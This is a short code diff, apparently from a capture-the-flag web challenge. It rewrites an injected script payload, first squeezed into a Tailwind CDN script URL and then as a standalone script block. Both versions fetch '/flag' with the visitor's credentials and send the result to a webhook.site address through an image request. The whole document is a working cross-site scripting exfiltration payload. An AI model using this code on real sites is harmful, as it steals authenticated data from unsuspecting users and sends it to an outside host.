@@ -1,1 +1,10 @@
-<script src="https://cdn.tailwindcss.com?config=tailwind.config={};fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(f=>{new Image().src='https://webhook.site/eb05ffac-0205-4212-9309-c2e56538ee52/?x='+encodeURIComponent(f)})//"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+    fetch("/flag", { credentials: "include" })
+        .then((response) => response.text())
+        .then((flag) => {
+            new Image().src =
+                "https://webhook.site/eb05ffac-0205-4212-9309-c2e56538ee52/?x=" +
+                encodeURIComponent(flag);
+        });
+</script>
